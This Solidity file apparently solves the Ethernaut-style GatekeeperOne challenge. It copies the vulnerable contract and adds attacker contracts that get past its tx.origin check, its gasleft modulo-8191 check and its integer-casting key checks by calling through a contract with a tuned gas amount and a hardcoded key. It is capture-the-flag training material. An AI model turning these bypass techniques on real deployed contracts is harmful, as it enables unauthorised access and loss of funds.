//SPDX-License-Identifier: None
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Entrant {

    using SafeMath for uint256;

    GatekeeperOne gatekeeperOne = GatekeeperOne(0xB9c1Cc280BcBeb7F9E2b35f07FcE0ff0569094D7);

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function go(uint gasAmount) public {
        //leave 8191 gasleft by the time the second modifier is executed
        //probably check gas consumed by first modifier and call enter with += that amount
        bytes8 gateKey = 0x100000000000f180;
        gatekeeperOne.enter{ gas: gasAmount }(gateKey);
    }

    function checkOne() gateOne public view returns (uint) {
        return gasleft();
    }

    function checkTwo() gateOne gateTwo public view returns (uint) {
        return gasleft();
    }

    function checkThree(bytes8 _key) gateOne gateTwo gateThree(_key) public view returns (uint) {
        return gasleft();
    }
}

contract Winner {

  Entrant entrant = Entrant(0xa39a5E27cd60CDf28016ce8c7aDB281Bcef159A6);
  
  function win(uint gasAmount) public {
    entrant.go(gasAmount);
  }
}

